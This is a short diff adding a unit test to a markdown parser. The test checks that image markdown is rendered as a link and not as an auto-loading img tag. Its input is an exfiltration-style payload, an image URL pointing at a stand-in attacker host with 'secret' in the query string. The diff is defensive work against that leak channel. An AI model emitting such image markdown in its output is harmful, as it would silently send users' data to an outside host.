@@ -156,6 +156,12 @@ describe('markdown-parser', () => {
     });
 
     describe('parseAnswerMarkdown', () => {
+        it('renders image markdown as a link, never an img that loads on render', () => {
+            const html = parseAnswerMarkdown('![leak](https://evil.example/?q=secret)');
+            expect(html).not.to.contain('<img');
+            expect(html).to.contain('href="https://evil.example/?q=secret"');
+        });
+
         it('keeps straight quotes and double hyphens', () => {
             const line = `this.setAttribute('data-promotion-code', "value"); run --flag`;
             expect(fragment(parseAnswerMarkdown(line)).textContent).to.include(line);
